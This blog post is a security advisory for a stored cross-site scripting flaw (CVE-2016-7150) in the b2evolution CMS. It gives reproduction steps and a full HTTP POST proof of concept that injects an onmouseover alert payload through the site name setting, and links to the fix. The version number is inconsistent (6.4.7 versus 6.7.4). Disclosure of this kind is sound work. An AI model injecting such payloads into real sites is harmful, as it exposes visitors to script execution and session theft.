---
layout: post
title: B2evolution v6.4.7 website title XSS [CVE-2016-7150]
---

发现者: 陈瑞琦 

发现日期: 2016-08-11

下载地址: [b2evolution](http://b2evolution.net/downloads/)

作者: b2evolution.net

作者通知日期: 2016-08-11

作者联系手段: http://b2evolution.net/?disp=msgform

CVE-ID：CVE-2016-7150

**描述:**

b2evolutioe is a content and community management system written in PHP and backed by a MySQL database. It is distributed as free software under the GNU General Public License.
b2evolution originally started as a multi-user multi-blog engine when Fran?ois Planque forked b2evolution from version 0.6.1 of b2/cafelog in 2003.[2] A more widely known fork of b2/cafelog is WordPress. b2evolution is available in web host control panels as a "one click install" web app.[3](Wiki)

**细节:** 

There is stored XSS in b2evolution version 6.7.4

An authentic user can inject javascript code in the website header.

A moderator can change the "Short site name" or the "Longe site name" at back-office site-settings page with something like {test_short_name_xss" onmouseover=alert(1) on}.

Step 1 : Login the back-office as a moderator

Step 2 : Edit the "Short site name" at http://192.168.204.128/b2evolution/
admin.php?ctrl=collections&tab=site_settings with something like {test_short_name_xss" onmouseover=alert(1) on}

Step 3 : Save the changes

Step 4 : Anyone view the site, when the mouse over the content(the header of the site), the XSS code runs.

**PoC:**

`code`
<pre><code>
POST /b2evolution/admin.php HTTP/1.1
Host: 192.168.204.128
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://192.168.204.128/b2evolution/admin.php?ctrl=collections&tab=site_settings
Cookie: session_b2evo_192_168_204_128=50_BTD1n98LyyQAYUsyXDD4Kv9IPvGwEVO0; __smToken=AhuNTZNC8BaMfAVQV7ZpTW5a; evo_style=Variation
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 646

site_code=b2evo&site_color=%23ff8c0f&notification_short_name=test_short_name_xss%22onmouseover%3D%22alert%281%29%22on%3D%221&notification_long_name=_name&notification_logo=http%3A%2F%2Ftesttest1.test&site_footer_text=C%22ookies+are+required+to+enable+core+site+functionality.+%26copy%3B%24year%24+by+%24short_site_name%24.&site_skins_enabled=1&site_terms=12&default_blog_ID=1&info_blog_ID=1&login_blog_ID=1&msg_blog_ID=1&reloadpage_timeout_value=5&reloadpage_timeout_name=minute&general_cache_enabled=1&submit=Save+Changes%21&crumb_collectionsettings=cxoiVqilvis2bz9Se6WJsIc2DTgvhQFX&ctrl=collections&tab=site_settings&action=update_settings_site

</code></pre>

**Fix:**

https://github.com/b2evolution/b2evolution/commit/dd975fff7fce81bf12f9c59edb1a99475747c83c